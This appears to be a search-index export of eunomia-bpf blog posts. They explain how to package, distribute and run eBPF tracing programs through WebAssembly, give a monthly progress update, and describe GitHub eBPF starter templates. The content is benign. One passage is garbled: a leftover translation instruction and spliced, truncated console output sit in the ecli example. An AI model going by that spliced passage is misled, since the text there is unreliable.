Wasm Meets eBPF: Writing, Distributing, Loading, and Running eBPF Programs with WebAssembly","text":"<p>In today's cloud-native world, eBPF and WebAssembly are two of the hottest lightweight code execution sandboxes/virtual machines. Both of them run high-performance bytecode programs compiled from languages such as C, C++, and Rust, and both are cross-platform and portable. The biggest difference between them is that eBPF runs in the Linux kernel, while WebAssembly runs in user space. We want to make an attempt to integrate them: using Wasm to write universal eBPF programs that can be distributed to different versions and architectures of Linux kernels without the need for recompiling.</p>"},{"location":"blogs/ebpf-wasm/#webassembly-vs-ebpf","title":"WebAssembly vs. eBPF","text":"<p>WebAssembly (abbreviated as Wasm) is a binary instruction format based on a stack-based virtual machine. Wasm is designed for a portable target and can be used as a compilation target for high-level languages such as C/C++/Rust to enable the deployment of client-side and server-side applications on the Web. Wasm has multiple runtime implementations, including browsers and standalone systems, and it can be used in applications such as video and audio codecs, graphics and 3D, multimedia and gaming, cryptographic calculations, or portable language implementations.</p> <p>Although Wasm was designed as a bytecode standard to improve the performance of performance-sensitive modules on the web, it can be used not only in browsers but also in other environments. Wasm has evolved into a lightweight, high-performance, cross-platform, and multi-language software sandbox environment used in cloud-native software components. Compared to Linux containers, WebAssembly has a startup speed that is 100 times faster, consumes less memory and disk space, and has a better-defined security sandbox. However, the trade-off is that WebAssembly requires its own language SDK and compiler toolchain, making it a more constrained development environment compared to Linux containers. WebAssembly is increasingly being used in edge computing scenarios where deploying Linux containers or application performance is critical.</p> <p>The compilation and deployment process of Wasm is as follows:</p> <p></p> <p>Usually, high-level languages such as C/C++/Rust can be compiled into Wasm bytecode and then loaded and executed in the Wasm virtual machine. The Wasm virtual machine will interpret or JIT the Wasm bytecode into machine code for the corresponding platform (such as x86/arm) to run.</p> <p>eBPF originated from BPF and is essentially an efficient and flexible virtual machine component in the kernel that executes bytecode in a secure manner at various kernel hook points. Originally designed for efficient network packet filtering, BPF has evolved into a top-level subsystem in the kernel and has become a general-purpose execution engine. Developers can use eBPF to develop performance analysis tools, software-defined networks, security, and many other scenarios. eBPF has some programming restrictions and needs to be validated to ensure its safety in the kernel application scenarios (e.g., no infinite loops, out-of-bounds memory access, etc.), but this also means that the programming model of eBPF is not Turing complete. In contrast, WebAssembly is a Turing complete language with extensions like WebAssembly System Interface (WASI) that can break out of the sandbox and access native OS libraries. At the same time, the Wasm runtime can safely isolate and execute user space code with performance close to native code. There are many differences between the two in terms of their main domains, but there are also many overlapping areas.</p> <p>There have been attempts to run WebAssembly in the Linux kernel, but they have generally not been successful. eBPF is a better choice for this use case. However, WebAssembly programs can handle many kernel-like tasks and can be compiled ahead of time (AOT) into native applications. WasmEdge Runtime from CNCF is a great LLVM-based cloud-native WebAssembly compiler. Native applications consolidate all sandbox checks into native libraries, allowing WebAssembly programs to behave like standalone \"library operating systems.\" In addition, these AOT-compiled sandboxed WebAssembly applications can run on microkernel operating systems like seL4 and take over many \"kernel-level\" tasks[1].</p> <p>While WebAssembly can be brought down to the kernel level, eBPF can also be brought up to the application level. In the sidecar proxy, Envoy Proxy pioneered the use of WebAssembly as an extension mechanism for programming the data plane. Developers can write proxy logic for specific applications in languages such as C, C++, Rust, AssemblyScript, Swift, and TinyGo and compile the module into Wasm. With the proxy-Wasm standard, proxies can execute those Wasm plugins in high-performance runtimes such as Wasmtime and WasmEdge[2].Although many applications currently use both, most of the time these two virtual machines are independent and have no intersection. For example, in an observability application, data is collected using eBPF probes and then data processing is performed by introducing Wasm plugin modules in user space. The distribution, running, loading, and control of Wasm modules and eBPF programs are independent of each other, with only a data flow association.</p>"},{"location":"blogs/ebpf-wasm/#our-attempt","title":"Our Attempt","text":"<p>Generally speaking, a complete eBPF application consists of two parts: user space programs and kernel programs:</p> <ul> <li>User space programs are responsible for loading BPF bytecode into the kernel or reading statistical information or event details returned by the kernel for relevant data processing and control.</li> <li>The BPF bytecode in the kernel is responsible for executing specific events in the kernel and may send the execution results to user space through maps or perf-event events.</li> </ul> <p>User space programs can control some parameters and variables of eBPF programs as well as mounting points before loading eBPF programs. They can also communicate bidirectionally between user space and kernel space through maps and other methods. Usually, user space eBPF programs can be developed based on the <code>libbpf</code> library to control the loading and running of kernel space eBPF programs. So, if all the control and data processing logic in user space is moved to the Wasm virtual machine, the eBPF bytecode can be packaged and distributed through the Wasm module, and the loading and execution of the entire eBPF program can be controlled internally in the Wasm virtual machine. Perhaps we can combine the advantages of both and allow any eBPF program to have the following features:</p> <ul> <li><code>Portability</code>: Make eBPF tools and applications completely platform-independent and portable, without the need for recompilation to distribute across platforms.</li> <li><code>Isolation</code>: With the reliability and isolation of Wasm, make the loading and execution of eBPF programs and the user space data processing flow more secure and reliable. In fact, the user space control code of an eBPF application is usually much larger than the kernel space code.</li> <li><code>Package Management</code>: With the ecosystem and toolchain of Wasm, complete the distribution, management, and loading of eBPF programs or tools. Currently, the eBPF program or tool ecosystem may lack a universal package management or plugin management system.</li> <li><code>Cross-Language</code>: Currently, eBPF programs are developed in various user space languages \u200b\u200b(such as Go\\Rust\\C\\C++\\Python, etc.). More than 30 programming languages \u200b\u200bcan be compiled into WebAssembly modules, allowing developers from various backgrounds (C, Go, Rust, Java, TypeScript, etc.) to write user space eBPF programs in their chosen language without the need to learn a new language.</li> <li><code>Agility</code>: For large eBPF applications, Wasm can be used as a plugin extension platform: extension programs can be delivered and reloaded directly from the control plane at runtime. This means that everyone can use official and unmodified applications to load custom extensions, and any errors and/or updates to any eBPF program can be pushed and/or tested at runtime without the need to update and/or redeploy a new binary.</li> <li><code>Lightweight</code>: WebAssembly microservices consume 1% of resources and have a cold start time of 1% compared to Linux container applications. With this, we may be able to implement eBPF as a service, making the loading and execution of eBPF programs more lightweight, fast, and easy.</li> </ul> <p>eunomia-bpf is a project started and incubated in the \"eBPF Technology Exploration SIG\" [3] [5]. It is also open source on Github [4]. eunomia-bpf is a lightweight development and loading framework for eBPF programs, containing a user space dynamic loading framework/runtime library and a simple toolchain container for compiling Wasm and eBPF bytecode. In fact, writing eBPF code in a Wasm module is basically the same as using the libbpf framework or Coolbpf to develop eBPF programs in the usual familiar way. The complexity of Wasm is hidden in the compilation toolchain and runtime library of eunomia-bpf. Developers can focus on the development and debugging of eBPF programs without the need to understand the background knowledge of Wasm or worry about Wasm's compilation environment configuration.</p>"},{"location":"blogs/ebpf-wasm/#distributing-and-dynamically-loading-ebpf-programs-with-wasm-modules","title":"Distributing and Dynamically Loading eBPF Programs with Wasm Modules","text":"<p>The eunomia-bpf library includes a simple command-line tool (ecli) that contains a small Wasm runtime module and the ability to dynamically load eBPF. It can be downloaded and used directly:</p> <pre><code># download the release from https://github.com/eunomia-bpf/eunomia-bpf/releases/latest/download/ecli\n$ wget https://aka.pw/bpf-ecli -O ecli &amp;&amp; chmod +x ./ecli\n$ sudo ./ecli run https://eunomia-bpf.github.io/eunomia-bpf/sigsnoop/app.wasm\"Instructions: Translate the following Chinese text to English \nwhile maintaining the original formatting: \"2022-10-11 14:05:50 URL:https://eunomia-bpf.github.io/eunomia-bpf/sigsnoop/app.wasm [70076/70076] -&gt; \"/tmp/ebpm/app.wasm\" [1]\nrunning and waiting for the ebpf events from perf event...\n{\"pid\":1709490,\"tpid\":1709077,\"sig\":0,\"ret\":0,\"comm\":\"node\",\"sig_name\":\"N/A\"}\n{\"pid\":1712603,\"tpid\":1717412,\"sig\":2,\"ret\":0,\"comm\":\"kworker/u4:3\",\"sig_name\":\"SIGINT\"}\n{\"pid\":1712603,\"tpid\":1717411,\"sig\":2,\"ret\":0,\"comm\":\"kworker/u4:3\",\"sig_name\":\"SIGINT\"}\n{\"pid\":0,\"tpid\":847,\"sig\":14,\"ret\":0,\"comm\":\"swapper/1\",\"sig_name\":\"SIGALRM\"}\n{\"pid\":1709490,\"tpid\":1709077,\"sig\":0,\"ret\":0,\"comm\":\"node\",\"sig_name\":\"N/A\"}\n{\"pid\":1709139,\"tpid\":1709077,\"sig\":0,\"ret\":0,\"comm\":\"node\",\"sig_name\":\"N/A\"}\n{\"pid\":1717420,\"tpid\":1717419,\"sig\":17,\"ret\":0,\"comm\":\"cat\",\"sig_name\":\"SIGCHLD\"}`\"ts\":0,\"pid\":2344,\"uid\":0,\"ret\":26,\"flags\":0,\"comm\":\"YDService\",\"fname\":\"/proc/1718823/cmdline\"}`\n`{\"ts\":0,\"pid\":2344,\"uid\":0,\"ret\":26,\"flags\":0,\"comm\":\"YDService\",\"fname\":\"/proc/1718824/cmdline\"}`\n`{\"ts\":0,\"pid\":2344,\"uid\":0,\"ret\":26,\"flags\":0,\"comm\":\"YDService\",\"fname\":\"/proc/self/stat\"}`\n\nopensnoop tracks the `open()` system call of a process, which means all file opening operations in the kernel. Here we can see process information such as PID, UID, return value, flags, process name, and file name. The eBPF program in kernel space is distributed within a Wasm module and is relocated using BTF information and libbpf during loading to adapt to different kernel versions. Additionally, because the user-space related processing code is entirely written in Wasm and the kernel-space is written in eBPF instructions, it is not restricted by specific instruction sets (e.g., x86, ARM) and can run on different platforms.\n\n### Developing and Packaging eBPF Programs with Wasm\n\nSimilarly, taking the example of sigsnoop mentioned earlier for tracking signal sending and receiving of a process, we first need to write the eBPF code in the kernel space in `sigsnoop.bpf.c`:\n\n```c\n#include &lt;vmlinux.h&gt;\n#include &lt;bpf/bpf_helpers.h&gt;\n#include \"sigsnoop.h\"\n\nconst volatile pid_t filtered_pid = 0;\n.....\n\nstruct {\n __uint(type, BPF_MAP_TYPE_PERF_EVENT_ARRAY);\n __uint(key_size, sizeof(__u32));\n __uint(value_size, sizeof(__u32));\n} events SEC(\".maps\");\n\nSEC(\"tracepoint/signal/signal_generate\")\nint sig_trace(struct trace_event_raw_signal_generate *ctx)\n{\n struct event event = {};\n pid_t tpid = ctx-&gt;pid;\n int ret = ctx-&gt;errno;\n int sig = ctx-&gt;sig;\n __u64 pid_tgid;\n __u32 pid;\n\n ...\n pid_tgid = bpf_get_current_pid_tgid();\n pid = pid_tgid &gt;&gt; 32;\n if (filtered_pid &amp;&amp; pid != filtered_pid)\n  return 0;\n\n event.pid = pid;\n event.tpid = tpid;\n event.sig = sig;\n event.ret = ret;\n bpf_get_current_comm(event.comm, sizeof(event.comm));\n bpf_perf_event_output(ctx, &amp;events, BPF_F_CURRENT_CPU, &amp;event, sizeof(event));\n return 0;\n}\n\nchar LICENSE[] SEC(\"license\") = \"Dual BSD/GPL\";\n</code></pre> <p>Here, we use the <code>tracepoint/signal/signal_generate</code> tracepoint to track the signal generation events in the kernel. The kernel code exports information to user space using <code>BPF_MAP_TYPE_PERF_EVENT_ARRAY</code>. Therefore, we need to define a structure for exporting information in the <code>sigsnoop.h</code> header file:</p> <pre><code>#ifndef __SIGSNOOP_H\n#define __SIGSNOOP_H\n\n#define TASK_COMM_LEN 16\n\nstruct event {\n unsigned int pid;\n unsigned int tpid;\n int sig;\n int ret;\n char comm[TASK_COMM_LEN];\n};\n\n#endif /* __SIGSNOOP_H */\n</code></pre> <p>We can compile it into JSON format using the eunomia-bpf toolchain, generate a <code>package.json</code> file, and directly run it using the ecli command:</p> <p><code>console\".</code>console $ docker run -it -v <code>pwd</code>/:/src/ ghcr.io/eunomia-bpf/ecc-<code>uname -m</code>:latest make   BPF      .output/client.bpf.o   GEN-SKEL .output/client.skel.h   CC       .output/client.o   CC       .output/cJSON.o   CC       .output/create_skel_json.o   BINARY   client   DUMP_LLVM_MEMORY_LAYOUT   DUMP_EBPF_PROGRAM   FIX_TYPE_INFO_IN_EBPF   GENERATE_PACKAGE_JSON</p> <p>$ sudo ./ecli run package.json running and waiting for the ebpf events from perf event... time pid tpid sig ret comm 14:39:39 1723835 1723834 17 0 dirname 14:39:39 1723836 1723834 17 0 chmod 14:39:39 1723838 1723837 17 0 ps 14:39:39 1723839 1723837 17 0 grep 14:39:39 1723840 1723837 17 0 grep 14:39:39 1723841 1723837 17 0 wc</p> <pre><code>All of our build toolchains have been packaged as Docker images and published to Docker Hub, \nso they can be used directly. At this time, only the kernel-space eBPF code and some auxiliary information are dynamically loaded and executed, \nhelping the eunomia-bpf library automatically obtain events reported from kernel-space to user-space. \nIf we want to perform some parameter configuration and adjustment in user-space, as well as data processing, \nwe need to write code in user-space and package the kernel-space eBPF code and user-space code into a complete eBPF program.\n\nA one-liner command can directly generate a user-space WebAssembly development framework for eBPF programs:\n\n```console\n$ docker run -it -v `pwd`/:/src/ ghcr.io/eunomia-bpf/ecc-`uname -m`:latest gen-wasm-skel\nmake\n  GENERATE_PACKAGE_JSON\n  GEN-Wasm-SKEL\n$ ls\napp.c eunomia-include ewasm-skel.h package.json README.md  sigsnoop.bpf.c  sigsnoop.h\n</code></pre> <p>The Wasm development framework we provide is written in C and includes the following files:</p> <ul> <li>ewasm-skel.h: the header file of the user-space WebAssembly development framework,   which contains the pre-compiled eBPF program bytecode and the eBPF program framework auxiliary information for dynamic loading;</li> <li>eunomia-include: some header-only library functions and auxiliary files to assist development;</li> <li>app.c: the main code of the user-space WebAssembly program, which includes the main logic of the eBPF program and the data processing flow of the eBPF program.</li> </ul> <p>Take <code>sigsnoop</code> as an example. In user-space, it includes some code for command line parsing, configuring the eBPF program, and data processing. It adds the English names of signal events based on the signal number:</p> <pre><code>....\nint main(int argc, const char** argv)\n{\n  struct argparse_option options[] = {\n        OPT_HELP(),\n        OPT_BOOLEAN('x', \"failed\", &amp;failed_only, \"failed signals only\", NULL, 0, 0),\n        OPT_BOOLEAN('k', \"killed\", &amp;kill_only, \"kill only\", NULL, 0, 0),\n        OPT_INTEGER('p', \"pid\", &amp;target_pid, \"target pid\", NULL, 0, 0),\n  OPT_INTEGER('s', \"signal\", &amp;target_signal, \"target signal\", NULL, 0, 0),\n        OPT_END(),\n    };\n\n  struct argparse argparse;\n  argparse_init(&amp;argparse, options, usages, 0);\n  argparse_describe(&amp;argparse, \"Trace standard and real-time signals.\\n\", \"\");\n  argc = argparse_parse(&amp;argparse, argc, argv);\n\n  cJSON *program = cJSON_Parse(program_data);\n  program = set_bpf_program_global_var(program, \"filtered_pid\", cJSON_CreateNumber(target_pid));\n  program = set_bpf_program_global_var(program, \"target_signal\", cJSON_CreateNumber(target_signal));\n  program = set_bpf_program_global_var(program, \"failed_only\", cJSON_CreateBool(failed_only));\n  return start_bpf_program(cJSON_PrintUnformatted(program));\n}\n\nint process_event(int ctx, char *e, int str_len)\n{\n cJSON *json = cJSON_Parse(e);\n int sig = cJSON_GetObjectItem(json, \"sig\")-&gt;valueint;\n const char *name = sig_name[sig];\n cJSON_AddItemToObject(json, \"sig_name\", cJSON_CreateString(name));\n char *out = cJSON_PrintUnformatted(json);\n printf(\"%s\\n\", out);\n return 0;\n}\n</code></pre> <p>Finally, the use of container images can complete the compilation and packaging of WebAssembly/eBPF programs in one command. Use ecli to run with one click:</p> <pre><code>$ docker run -it -v `pwd`/:/src/ ghcr.io/eunomia-bpf/ecc-`uname -m`:latest build-wasm\nmake\n  GENERATE_PACKAGE_JSON\n  BUILD-Wasm\nbuild app.wasm success\n$ sudo ./ecli run app.wasm -h\nUsage: sigsnoop [-h] [-x] [-k] [-n] [-p PID] [-s SIGNAL]\n</code></pre> <p>Since we use the libbpf framework to load and start eBPF programs based on one-time compilation and universal execution, the compilation and execution steps are completely separate. eBPF programs can be distributed and deployed directly over the network or any other means, without relying on specific kernel versions. With the lightweight nature of WebAssembly, the startup speed of eBPF programs is also much faster than that of libbpf programs distributed in image form, usually taking less than 100 ms to complete. Compared to the time and resources consumed by LLVM and Clang for compiling and running when deploying and starting with BCC, it is a qualitative leap.</p> <p>For the complete code of the example program mentioned above, you can refer to here [6].</p>"},{"location":"blogs/ebpf-wasm/#demo-video","title":"Demo video","text":"<p>We also have a demonstration video on Bilibili, which demonstrates how to port an eBPF tool program from bcc/libbpf-tools to eunomia-bpf and distribute and load eBPF programs using Wasm or JSON files: https://www.bilibili.com/video/BV1JN4y1A76k</p>"},{"location":"blogs/ebpf-wasm/#how-we-did-it","title":"How we did it","text":"<p><code>ecli</code> is a simple command-line tool based on our underlying eunomia-bpf library and runtime implementation. Our project architecture is shown in the following diagram:</p> <p></p> <p>The <code>ecli</code> tool is implemented based on the <code>ewasm</code> library, which includes a WAMR (wasm-micro-runtime) runtime and an eBPF dynamic loading module built on the libbpf library. In general, we added a layer of abstraction (eunomia-bpf library) between the <code>Wasm</code> runtime and user-space <code>libbpf</code>, so that eBPF code that can be compiled and run once can be dynamically loaded from a JSON object. The JSON object is included in the Wasm module at compile time, so at runtime, we can parse the JSON object to retrieve information about the eBPF program and then dynamically load the eBPF program.The process of compiling and distributing eBPF programs using Wasm or JSON can be roughly summarized as follows:</p> <p></p> <p>In general, the writing and loading of the entire eBPF program can be divided into three parts:</p> <ol> <li>Use the eunomia-cc toolchain to compile the eBPF code skeleton and bytecode of the kernel into JSON format.</li> <li>Embed JSON data in a high-level language (such as C) developed in user space, and provide some APIs to manipulate the JSON-formatted eBPF program skeleton.</li> <li>Compile the user space program and JSON data into Wasm bytecode and package it as a Wasm module, then load and run the Wasm program on the target machine.</li> <li>Load the embedded JSON data from the Wasm module and dynamically load and configure the eBPF program skeleton using the eunomia-bpf library.</li> </ol> <p>What we need to do is only a small amount of native API and Wasm runtime bindings, and process JSON data in Wasm code. You can have multiple eBPF programs in a single Wasm module. If you don't want to use our provided Wasm runtime or want to develop user-space eBPF auxiliary code in another language, you can complete some WebAssembly bindings based on our eunomia-bpf library.</p> <p>In addition, for the eunomia-bpf library, it is not necessary to have a Wasm module and runtime to start and dynamically load eBPF programs. In this case, only the bytecode of the eBPF program in kernel space will be dynamically loaded and run. You can manually or using any language modify the JSON object to control the loading and parameters of the eBPF program, and obtain the returned data automatically through eunomia-bpf. For beginners, this may be simpler and more convenient than using WebAssembly: just write the eBPF program in kernel space, then use the eunomia-cc toolchain to compile it into JSON format, and finally load and run it using the eunomia-bpf library. There is no need to consider any user-space auxiliary programs, including WebAssembly. For specific details, please refer to our user manual [7] or sample code [8].</p>"},{"location":"blogs/ebpf-wasm/#future-directions","title":"Future directions","text":"<p>Currently, the implementation of the eunomia-bpf toolchain is far from perfect, there is only a version for feasibility verification. For a development toolchain, specific API standards and related ecosystems are very important. If there is an opportunity, we hope that we can discuss with other members of the SIG community to form a specific API standard, which can provide a common, cross-platform, and kernel version plugin ecosystem based on technologies such as eBPF and Wasm, to add eBPF and Wasm capabilities to their respective applications.</p> <p>Currently, the cross-kernel version dynamic loading feature of eunomia-bpf depends on the BTF information of the kernel. The Coolbpf project [9] of the SIG community itself can provide automatic generation of BTF and adaptation for low version kernels. Future support for low version kernels will be based on the existing part of Coolbpf. At the same time, we will provide similar features to the eunomia-bpf library for the Coolbpf API implementation and remote compilation backend, so that programs developed using the Coolbpf API can be used directly on any kernel version and architecture after remote compilation, without the need to connect to remote servers again during deployment. The compiled eBPF program can also be used directly as a development package for languages such as Go, Python, and Rust, allowing developers to easily obtain the information reported by the eBPF program without the need for any compilation process for the eBPF program.</p> <p>The SIG community is incubated in the Linux Microscope (LMP) project [10] in universities, and there are also plans to provide common, standardized, downloadable and runnable eBPF programs or tool libraries based on eunomia-bpf, which are currently being further improved.</p>"},{"location":"blogs/ebpf-wasm/#references","title":"References","text":"<ol> <li>eBPF and WebAssembly: Which VM Will Dominate the Cloud-Native Era? https://juejin.cn/post/7043721713602789407</li> <li>eBPF and Wasm: Exploring the Future of the Service Mesh Data Plane: https://cloudnative.to/blog/ebpf-wasm-service-mesh/</li> <li>eBPF Technology Exploration SIG Homepage: https://openanolis.cn/sig/ebpfresearch</li> <li>eunomia-bpf GitHub repository: https://github.com/eunomia-bpf/eunomia-bpf.5. eunomia-bpf Mirror Repository: https://gitee.com/anolis/eunomia</li> <li>sigsnoop Sample Code: https://gitee.com/anolis/eunomia/tree/master/examples/bpftools/sigsnoop</li> <li>eunomia-bpf User Manual: https://openanolis.cn/sig/ebpfresearch/doc/646023027267993641</li> <li>More Sample Code: https://gitee.com/anolis/eunomia/tree/master/examples/bpftools/sigsnoop</li> <li>Coolbpf Project Introduction: https://openanolis.cn/sig/ebpfresearch/doc/633529753894377555</li> <li>LMP Project Introduction: https://openanolis.cn/sig/ebpfresearch/doc/633661297090877527</li> </ol> <p>Share on  Share on </p>"},{"location":"blogs/eunomia-bpf%E7%9A%84%E4%B8%89%E6%9C%88%E8%BF%9B%E5%B1%95/","title":"Progress of eunomia-bpf in March","text":"<p>The eunomia-bpf project is an open-source project aimed at providing a set of tools for writing and running eBPF programs more conveniently in the Linux kernel. In the past month, the project has made some new progress. Here is an overview of these advances.</p> <p>Firstly, the eunomia-bpf dynamic loading library has undergone some important updates. The library now supports the btf hub, which makes it easier to port eBPF programs on low kernel versions. The ecli program has also been completely rewritten and is now written in Rust, replacing the original version written in C++. In addition, the library has fixed the output issue when using JSON to dynamically load eBPF programs and automatically publishes Docker images in CI.</p> <p>Secondly, the Wasm-bpf project has also been updated. The project has added a series of examples that focus on security, networking, tracing, and other areas. The Wasm-bpf project has also added support for the Guest SDK in the Rust language and attempted to add support for the Guest SDK in the Go language. The runtime implementation of Rust and wasmtime has also been included in the project, and a runtime plugin has been added for WasmEdge. Furthermore, the project has undergone a series of fixes and documentation refactoring and has improved CI and testing. The project has also attempted to use the Wasm component model and added a tool for adding table exports defined in the wasm module. Lastly, the project has produced three blog posts and demonstration videos.</p> <p>Lastly, eunomia-bpf has added a new demo project called GPTtrace. This project uses ChatGPT to automate the generation of eBPF programs and tracing, making it easier for users to create and trace custom system events. The project has also updated the tutorial documentation to make it easier to use.</p> <p>Overall, the eunomia-bpf project has made significant progress in March. These updates and improvements make the project more user-friendly and flexible, expanding its functionality and scope. If you are interested in the project, you can follow its latest developments and updates.</p> <p>Here is a more detailed list of updates:</p> <ul> <li>eunomia-bpf dynamic loading library</li> <li>Added support for the btf hub, allowing better portability of eBPF programs on low kernel versions link</li> <li>Completely replaced the version written in C++ with ecli written in Rust link</li> <li>Fixed the output issue when using JSON to dynamically load eBPF programs link link</li> <li>Automatically publishes Docker images in CI link link</li> <li>Tried to add support on other platforms and performed more testing on RISC-V link</li> <li>Wasm-bpf</li> <li>Added a series of examples focusing on security, networking, tracing, and more link link link</li> <li>Added support for the Guest SDK in the Rust language link</li> <li>Attempted to add support for the Guest SDK in the Go language link</li> <li>Added the runtime implementation of Rust and wasmtime link</li> <li>Added a runtime plugin for WasmEdge link.- A series of minor fixes and documentation refactorings link link link link link</li> <li>Improvement of CI, testing, etc. link link</li> <li>Attempt of Wasm component model link</li> <li>A tool to add an export of the table defined in the wasm module link</li> <li>Production of three blogs and demo videos, etc.</li> <li>New demo project: GPTtrace: Generate eBPF programs and tracing with ChatGPT and natural language link</li> <li>Improvement of tutorial documentation: link</li> </ul> <p>Share on  Share on </p>"},{"location":"blogs/github-templates/","title":"Simplifying eBPF Development: GitHub Templates and Codespaces for Online Compilation and Execution","text":"<p>Embarking on the eBPF journey can feel daunting, especially when confronted with setting up the perfect environment or making the ideal language choice. But what if there was a streamlined way to immerse yourself in eBPF without the initial hurdles? Look no further! This guide unveils the magic of GitHub templates combined with GitHub Codespaces, empowering you to seamlessly initiate, compile, and run eBPF projects online. Dive in, click once, and turbocharge your eBPF expedition!</p>"},{"location":"blogs/github-templates/#ebpf-unveiling-the-linux-kernels-next-frontier","title":"eBPF: Unveiling the Linux Kernel's Next Frontier","text":"<p>At the heart of the Linux kernel lies eBPF (Extended Berkeley Packet Filter) \u2014 a revolutionary technology designed to dynamically inject and execute bite-sized programs, enriching the kernel's capabilities in realms like networking, security, and performance monitoring. Whether it's TCP/IP, UDP, or ICMP packets, eBPF manages them all, flexing its muscles in both user-space and kernel-space programming. </p> <p>But here's the catch: initiating an eBPF project often comes wrapped in complexities. From deep kernel insights to juggling diverse toolchains, and not to mention the pressing concerns of performance and security, developers can easily find themselves in a maze. But with the tools and insights we're about to share, your eBPF journey is about to get a whole lot smoother.</p>"},{"location":"blogs/github-templates/#how-to-swiftly-set-up-an-environment-and-choose-a-programming-language","title":"How to Swiftly Set Up an Environment and Choose a Programming Language?","text":"<p>When looking to create an eBPF project, are you puzzled about setting up the environment or selecting a programming language? Worry not! We've prepared a set of GitHub templates for you, enabling you to swiftly begin a fresh eBPF project. Simply click the <code>Use this template</code> button on GitHub to start.</p>"},{"location":"blogs/github-templates/#github-templates-fast-track-your-ebpf-project","title":"GitHub Templates: Fast-Track Your eBPF Project","text":"<p>Setting up the environment and basic configurations are essential yet tedious when you start an eBPF project. To save you time and effort, we've crafted a series of GitHub templates catering to different programming languages and frameworks to meet your varied needs. These templates let you quickly kick off a brand-new eBPF project without building everything from scratch.</p> <ul> <li>libbpf-starter-template: An eBPF project template based on the C language and the libbpf framework.</li> <li>cilium-ebpf-starter-template: An eBPF project template based on the C language and the cilium/ebpf framework.</li> <li>libbpf-rs-starter-template: An eBPF project template based on the Rust language and the libbpf-rs framework.</li> <li>eunomia-template: An eBPF project template based on the C language and the eunomia-bpf framework.</li> </ul> <p>These starter templates come with the following features:</p> <ul> <li>A Makefile that allows you to build the project with one click.</li> <li>A Dockerfile designed for automatically creating a containerized environment for your eBPF project and publishing it to GitHub Packages.</li> <li>GitHub Actions for automating the build, test, and release processes.</li> <li>All dependencies required for eBPF development.</li> </ul> <p>By setting up an existing repository as a template, both you and others can quickly generate new repositories with the same foundational structure. This eliminates the tedious process of manual creation and configuration. GitHub templates offer developers a simple way to kickstart a new project while quickly leveraging best practices and experiences shared by other developers.</p> <p>Once your repository is set as a template, other users can create a new one by:</p> <ol> <li>Opening the template repository page.</li> <li>Clicking on the \"Use this template\" button.</li> <li>Entering the new repository's name and description, and choosing an organization or personal account for its creation.</li> <li>Clicking on the \"Create repository from template\" button to finalize.</li> </ol> <p></p> <p>(Note: If auto-publishing images to GitHub Packages fails in the CI process, you may need to configure action permissions in the repository's Settings. Refer to the later sections for guidance.)</p> <p>With GitHub templates, you can quickly launch a new project, fast-track your understanding of best practices shared by other developers, and focus more on your project's core functionalities and logic, thereby improving development efficiency and code quality. In a GitHub template, you can choose to develop eBPF programs using the C language, Rust, or the eunomia-bpf framework. Additionally, you can utilize GitHub Actions for automating the building, testing, and releasing of eBPF binary and container images. For more detailed information, refer to the official documentation: Official Documentation Link</p>"},{"location":"blogs/github-templates/#github-codespaces-compile-ebpf-programs-in-the-cloud","title":"GitHub Codespaces: Compile eBPF Programs in the Cloud","text":"<p>GitHub Codespaces is a cloud-based development environment that offers rapid and flexible capabilities to compile and run eBPF programs. No more local software installations and configurations; you can easily build and debug eBPF programs using GitHub's primary services.</p> <p>Within Codespaces, each code repository has a corresponding Docker container containing all the tools and dependencies needed for your project. You can connect to Codespaces via a browser, Visual Studio Code, or JetBrains Gateway, accessing a fully customizable cloud-based development environment.</p> <p>Developing eBPF programs with GitHub Codespaces is straightforward:</p> <ol> <li>Open your eBPF project repository.</li> <li>Click on the \"Code\" button and then select the \"Open with Codespaces\" option.</li> </ol> <p></p> <ol> <li>GitHub will create a new Codespace for you, which will be equipped with all the required tools and dependencies for your project. This may take a few minutes, depending on your network speed and the repository size.</li> <li>Once your Codespace is ready, you can open the terminal, navigate to your project directory, and begin compiling and running your eBPF program.</li> </ol> <p></p> <p>Using GitHub Codespaces, you can bypass environmental setup, version compatibility issues, and always employ the latest development tools and frameworks. There's no need to worry about system hardware limitations, performance issues, or being confined to a particular location or device. With Codespaces, you can solely focus on coding and the project's core functionalities, enhancing development efficiency and code quality, ensuring faster and more efficient project progression. For more details, refer to: GitHub Codespaces Link</p>"},{"location":"blogs/github-templates/#run-ebpf-program-with-docker-in-one-step","title":"Run eBPF Program with Docker in One Step","text":"<p>Write code in codespace, and upon submission, Github Actions will compile and automatically publish a container image. To use the automated image publishing feature, configure actions permissions in the repository's Settings:</p> <p></p> <p>Next, you can run the eBPF program anywhere with docker in one step, like this:</p> <p><code>sudo docker run --rm -it --privileged ghcr.io/eunomia-bpf/libbpf-rs-template:latest</code></p> <p></p>"},{"location":"blogs/github-templates/#conclusion","title":"Conclusion","text":"<p>In the development of eBPF projects, we introduced how to quickly set up the environment, choose programming languages, and how to use the GitHub template to start projects. This saves a lot of time and effort for developers, allowing them to focus on creating core features and business logic. However, this is just a small part of the eBPF field. The eunomia-bpf community provides a development framework for eBPF and Wasm programs to make it easier for you to build, distribute, and deploy eBPF programs. Eunomia-bpf is committed to simplifying the writing, distribution, and dynamic loading of eBPF programs, as well as exploring the combination of eBPF and Wasm toolchains and runtimes:</p> <ul> <li>Github: https://github.com/eunomia-bpf</li> <li>Website: https://eunomia.dev</li> </ul> <p>We also have some other projects:</p> <ul> <li>wasm-bpf: A WebAssembly library, toolchain, and runtime designed specifically for eBPF programs, allowing for the building of Wasm user-space interactive programs.</li> <li>bpf-developer-tutorial: An open-source eBPF developer tutorial and knowledge base, offering a set of utilities to help beginners understand the various uses and tricks of eBPF.</li> <li>GPTtrace: Tools for generating eBPF programs and traces using ChatGPT and natural language.</li> </ul> <p>With the GitHub template and Codespaces, eBPF development has become more efficient, simpler, and reliable. You no longer need to waste time and energy configuring environments, choosing programming languages, or resolving compatibility issues. Instead, you can focus on creating more efficient and superior eBPF programs. We thank the eBPF community and GitHub for providing these powerful tools and support, enabling us to develop eBPF projects more easily and promote the development and application of this emerging technology. We believe that as more developers join the eBPF community, together we can build a smarter, more efficient, and reliable network and cloud-native application ecosystem. If you have any questions or suggestions about eBPF development, please feel free to contact us. We are always eager to communicate and share experiences.</p> <p>Share on  Share on </p>"},{"location":"blogs/how-to-write-c-in-wasm/","title":"Writing eBPF Programs in C/C++ and libbpf in WebAssembly","text":"<p>Authors: Yu Tong, Zheng Yusheng</p> <p>eBPF (extended Berkeley Packet Filter) is a high-performance kernel virtual machine that runs in the kernel space and is used to collect system and network information. With the continuous development of computer technology, eBPF has become increasingly powerful and is used to build various efficient online diagnostic and tracing 